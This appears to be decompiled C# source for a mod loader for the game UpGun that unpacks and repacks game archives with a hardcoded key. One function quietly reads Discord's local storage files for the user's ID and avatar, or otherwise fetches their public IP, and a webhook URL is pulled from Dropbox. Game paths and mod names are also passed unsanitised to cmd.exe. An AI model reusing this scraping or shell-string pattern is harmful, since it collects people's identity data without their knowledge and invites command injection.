using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using QueenIO;
using UpGun_Mod_Loader.Autres;

namespace UpGunModLoader3._0;

internal class Fonctions
{
	private static string appdatapath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming";

	private static string appdatapath1 = appdatapath + "\\.FLIPPY";

	public static string appdatapath2 = appdatapath1 + "\\UpGunMods";

	private static string appdatapath3 = appdatapath2 + "\\Mods";

	public static string appdatapath4 = appdatapath2 + "\\MyUploadedMods\\MyMods.txt";

	public static string appdatapath5 = appdatapath2 + "\\MyUploadedMods\\Username.txt";

	public static string path1 = appdatapath2 + "\\info.txt";

	private static string path2 = appdatapath2 + "\\repak.exe";

	private static string AESKey = "0xE2DCEB7A0BDE2963E5DCC79FA9664D6F6A9E604825948E9E3F7F47673564AE29";

	private static string ARPath = GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\AssetRegistry.bin";

	public static string PakGameFilePath = GetUpGunPath() + "\\UpGun-WindowsNoEditor.pak";

	public static string PakModsSupportFilePath = GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak";

	public static void Notif(string message, int time)
	{
		using Notifs notifs = new Notifs(message, time);
		notifs.ShowDialog();
	}

	public static string GetUpGunPath()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
		if (registryKey != null)
		{
			string[] subKeyNames = registryKey.GetSubKeyNames();
			foreach (string name in subKeyNames)
			{
				RegistryKey registryKey2 = registryKey.OpenSubKey(name);
				if (registryKey2 == null)
				{
					continue;
				}
				object value = registryKey2.GetValue("DisplayName");
				if (value != null && value.ToString().Contains("UpGun"))
				{
					object value2 = registryKey2.GetValue("InstallLocation");
					if (value2 != null)
					{
						return Path.Combine(value2.ToString(), "UpGun", "Content", "Paks");
					}
				}
				registryKey2.Close();
			}
		}
		return null;
	}

	public static async Task<string> GetWHLink()
	{
		HttpResponseMessage val = await new HttpClient().GetAsync("https://dl.dropboxusercontent.com/scl/fi/1ote2zc97u6xy6cig5bde/WebhookLink.txt?rlkey=8yz0uefnpjaedu69w7haeetvq&raw=1");
		if (val.IsSuccessStatusCode)
		{
			return (await val.Content.ReadAsStringAsync()).ToString();
		}
		return null;
	}

	public static void DeleteMod(string ModName)
	{
		File.Delete(GetUpGunPath() + "\\" + ModName + ".pak");
		if (Directory.Exists(appdatapath3 + "\\" + ModName))
		{
			Directory.Delete(appdatapath3 + "\\" + ModName, recursive: true);
			ResetBinFile();
			ReinstallAllMods();
			RepakTheNewBinFile();
		}
	}

	public static void InstallMod(string URL, string Name)
	{
		string text = appdatapath3 + "\\" + Name;
		new WebClient().DownloadFile(URL, text + ".zip");
		Thread.Sleep(200);
		ZipFile.ExtractToDirectory(text + ".zip", appdatapath3);
		File.Delete(text + ".zip");
		File.Move(text + ".pak", GetUpGunPath() + "\\" + Name + ".pak");
		if (Directory.Exists(text))
		{
			InjectJsonCode(text);
			RepakTheNewBinFile();
		}
	}

	public static void InjectJsonCode(string FolderJsonToInject)
	{
		try
		{
			AssetRegistry assetRegistry = new AssetRegistry();
			assetRegistry.Read(File.ReadAllBytes(ARPath));
			string[] files = Directory.GetFiles(FolderJsonToInject, "*.json");
			for (int i = 0; i < files.Length; i++)
			{
				AssetRegistry.FAssetData item = JsonConvert.DeserializeObject<AssetRegistry.FAssetData>(File.ReadAllText(files[i]));
				assetRegistry.fAssetDatas.Add(item);
			}
			File.WriteAllBytes(ARPath, assetRegistry.Make());
		}
		catch
		{
			MessageBox.Show("Une erreur s'est produite!");
		}
	}

	public static void ReinstallAllMods()
	{
		if (Directory.Exists(appdatapath3))
		{
			string[] directories = Directory.GetDirectories(appdatapath3);
			for (int i = 0; i < directories.Length; i++)
			{
				InjectJsonCode(directories[i]);
			}
		}
	}

	public static bool CheckIfModSupportInstalled()
	{
		if (!File.Exists(PakModsSupportFilePath))
		{
			InstallModsSupport();
			return false;
		}
		return true;
	}

	public static void InstallModsSupport()
	{
		if (Process.GetProcessesByName("UpGun-Win64-Shipping").Length != 0)
		{
			ExecuteCmdCommand("taskkill /f /im UpGun-Win64-Shipping.exe");
		}
		Thread.Sleep(300);
		Notif("Installation of the mods support... (you can take a coffee)", 3);
		ExecuteCmdCommand(path2 + " --aes-key " + AESKey + " unpack \"" + PakGameFilePath + "\"");
		File.Delete(PakGameFilePath);
		Directory.CreateDirectory(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun");
		File.Move(GetUpGunPath() + "\\UpGun-WindowsNoEditor\\UpGun\\AssetRegistry.bin", ARPath);
		ExecuteCmdCommand(path2 + " pack \"" + GetUpGunPath() + "\\UpGun-WindowsNoEditor\"");
		ExecuteCmdCommand(path2 + " pack \"" + GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
		Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor", recursive: true);
		File.Copy(ARPath, GetUpGunPath() + "\\AssetRegistry.bak");
		Notif("The mods support is installed.", 3);
	}

	public static void RepakTheNewBinFile()
	{
		File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
		ExecuteCmdCommand(path2 + " pack \"" + GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
	}

	public static void ResetBinFile()
	{
		File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
		File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\AssetRegistry.bin");
		File.Copy(GetUpGunPath() + "\\AssetRegistry.bak", ARPath);
		ExecuteCmdCommand(path2 + " pack \"" + GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
	}

	public static void MajModLoaderUpGun()
	{
		Notif("Checking if latest version of mod support is installed.", 1);
		ExecuteCmdCommand(path2 + " --aes-key " + AESKey + " unpack \"" + PakGameFilePath + "\"");
		if (File.Exists(GetUpGunPath() + "\\UpGun-WindowsNoEditor\\UpGun\\AssetRegistry.bin"))
		{
			Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor", recursive: true);
			File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
			File.Delete(GetUpGunPath() + "\\AssetRegistry.bak");
			Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry", recursive: true);
			InstallModsSupport();
			ReinstallAllMods();
			RepakTheNewBinFile();
		}
		else
		{
			Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor", recursive: true);
			Notif("Latest mods support is already installed!", 1);
		}
	}

	public static void ExecuteCmdCommand(string cmdCommand)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			RedirectStandardInput = true,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		process.Start();
		process.StandardInput.WriteLine("cd " + GetUpGunPath());
		process.StandardInput.WriteLine(cmdCommand);
		process.StandardInput.Flush();
		process.StandardInput.Close();
		process.WaitForExit();
		process.Close();
	}

	public static async Task<string> GetUploadedMods()
	{
		string text = "https://dl.dropboxusercontent.com/scl/fi/m9yrqsp2s74dpk7e1vzwt/Mods.txt?rlkey=b3in1nsnq2xnccw3ky78zqfxb&raw=1";
		HttpClient httpClient = new HttpClient();
		try
		{
			HttpResponseMessage val = await httpClient.GetAsync(text);
			if (val.IsSuccessStatusCode)
			{
				return (await val.Content.ReadAsStringAsync()).ToString();
			}
		}
		finally
		{
			((IDisposable)httpClient)?.Dispose();
		}
		return null;
	}

	public static string[] GetDiscordUserIdAndAvatar()
	{
		string[] array = new string[3] { "discord", "discordcanary", "discordptb" };
		for (int i = 0; i < array.Length; i++)
		{
			if (!Directory.Exists(Path.Combine(appdatapath, array[i])))
			{
				continue;
			}
			string[] files = Directory.GetFiles(Path.Combine(appdatapath, array[i], "Local Storage", "leveldb"), "*.ldb");
			for (int j = 0; j < files.Length; j++)
			{
				StreamReader streamReader = new StreamReader(files[j]);
				string pattern = "{\"_state\":{\"users\":\\[{\"id\":\"(.*?)\",\"avatar\":\"(.*?)\"";
				Match match = Regex.Match(streamReader.ReadToEnd(), pattern);
				if (match.Success)
				{
					return new string[2]
					{
						match.Groups[1].Value,
						match.Groups[2].Value
					};
				}
			}
		}
		JObject jObject = JObject.Parse(new WebClient().DownloadString("https://httpbin.org/ip"));
		return new string[2]
		{
			jObject["origin"].ToString(),
			""
		};
	}
}
